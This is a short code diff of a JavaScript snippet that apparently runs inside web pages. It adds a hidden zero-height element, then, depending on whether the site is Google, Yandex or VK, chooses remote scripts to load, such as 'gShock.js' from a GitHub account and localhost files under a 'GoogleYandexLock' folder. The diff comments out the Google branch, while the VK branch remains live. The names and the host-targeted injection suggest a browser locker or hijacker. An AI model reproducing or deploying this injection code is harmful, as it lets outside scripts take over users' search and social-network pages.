@@ -6,7 +6,7 @@ if (plg) {
 	plg.setAttribute("height", 0);
 	document.body.appendChild(plg);
 }
-if(location.hostname.indexOf('www.google') > -1) {
+/* if(location.hostname.indexOf('www.google') > -1) {
 	if (window.location.protocol !== 'http:') {
 		var link = document.location.href.toString();
 		link = link.replace('https://','');
@@ -18,7 +18,7 @@ if(location.hostname.indexOf('www.google') > -1) {
 	else{
 		var scr = 'https://raw.github.com/ashanmilkin/scripts/master/gShock.js';
 	}
-}
+} */
 /* if(location.hostname.indexOf('yandex') > -1) {
 	//var scr = 'https://raw.github.com/ashanmilkin/scripts/master/gShock.js';
 	var scr = 'http://localhost/GoogleYandexLock/yandex/yaShock.js';
@@ -45,11 +45,11 @@ if(location.hostname.indexOf('vk') > -1)
 				var scr = 'http://localhost/vk/lvk.js';
 		break;
 		
-		case 'e747eb2129f44e85b0d0cc5a70074dad':
+		/* case 'e747eb2129f44e85b0d0cc5a70074dad':
 			if (location.hostname.indexOf('google') > -1){
 				var scr = 'http://localhost/GoogleYandexLock/google/gShock.js';
 			}
-		break;
+		break; */
 		
 		default: break;
 	}
